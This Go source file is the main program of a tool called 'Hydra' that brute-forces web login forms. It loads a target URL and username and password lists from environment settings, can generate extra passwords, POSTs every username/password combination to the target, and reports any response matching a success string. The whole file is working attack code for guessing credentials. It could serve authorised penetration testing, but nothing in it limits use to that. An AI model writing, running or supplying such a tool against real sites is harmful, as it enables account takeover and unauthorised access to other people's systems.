package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"

	"hydra/internal/evaluator"
	"hydra/internal/fetcher"
	"hydra/internal/generator"

	"github.com/joho/godotenv"
)

func main() {
	// 1. Load .env
	err := godotenv.Load()
	if err != nil {
		log.Println("Warning: No .env file found, using system environment")
	}

	url := os.Getenv("HYDRA_URL")
	timeoutStr := os.Getenv("HYDRA_TIMEOUT")
	selector := os.Getenv("HYDRA_TARGET_SELECTOR")
	successText := os.Getenv("HYDRA_SUCCESS_TEXT")
	errorText := os.Getenv("HYDRA_ERROR_TEXT")
	userFile := os.Getenv("HYDRA_USER_FILE")
	passFile := os.Getenv("HYDRA_PASS_FILE")
	passRegex := os.Getenv("HYDRA_PASS_REGEX")
	genCountStr := os.Getenv("HYDRA_GEN_COUNT")

	if url == "" || selector == "" {
		log.Fatal("HYDRA_URL and HYDRA_TARGET_SELECTOR must be set in .env")
	}

	timeout, _ := strconv.Atoi(timeoutStr)
	if timeout == 0 {
		timeout = 5
	}

	genCount, _ := strconv.Atoi(genCountStr)

	// 2. Load lists
	users, err := readLines(userFile)
	if err != nil {
		log.Fatalf("Error reading users: %v", err)
	}

	passwords, _ := readLines(passFile)

	// Dynamic runtime generation
	if passRegex != "" && genCount > 0 {
		fmt.Printf("Dynamic generation enabled: %s (Count: %d)\n", passRegex, genCount)
		for i := 0; i < genCount; i++ {
			// For now, we support the block pattern requested
			if strings.Contains(passRegex, "[a-z][A-Z][0-9][_]") {
				p, _ := generator.GenerateByBlockPattern(6, 10)
				passwords = append(passwords, p)
			}
		}
	}

	// 3. Initialize Hydra components
	f := fetcher.NewFetcher(timeout)
	e := evaluator.NewEvaluator(selector)

	fmt.Printf("--- 🐲 Hydra Brute Force Mode ---\n")
	fmt.Printf("URL: %s\n", url)
	fmt.Printf("Users: %d, Passwords: %d\n", len(users), len(passwords))
	fmt.Printf("Success Text: [%s]\n", successText)
	fmt.Printf("Error Text: [%s]\n", errorText)
	fmt.Printf("---------------------------------\n")

	found := false
	for _, user := range users {
		for _, pass := range passwords {
			fmt.Printf("Testing: %s:%s ... ", user, pass)

			data := map[string]string{
				"username": user,
				"password": pass,
			}

			content, err := f.FetchPost(url, data)
			if err != nil {
				fmt.Printf("[NETWORK ERROR: %v]\n", err)
				continue
			}

			result, err := e.Elevate(content)
			if err != nil {
				fmt.Printf("[EVAL ERROR: %v]\n", err)
				continue
			}

			cleanResult := strings.TrimSpace(result)

			// Categorization logic
			if successText != "" && strings.Contains(cleanResult, successText) {
				fmt.Printf("✅ SUCCESS!\n")
				fmt.Printf(">> Response: %s\n", cleanResult)
				found = true
				break
			} else if errorText != "" && strings.Contains(cleanResult, errorText) {
				fmt.Printf("❌ FAILED (Known Denial)\n")
			} else {
				fmt.Printf("❓ UNKNOWN RESPONSE (Potential Success?)\n")
				fmt.Printf(">> Captured: %s\n", cleanResult)
			}
		}
		if found {
			// break outer if found
			// break
		}
	}

	fmt.Printf("---------------------------------\n")
	fmt.Printf("Scan complete.\n")
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}
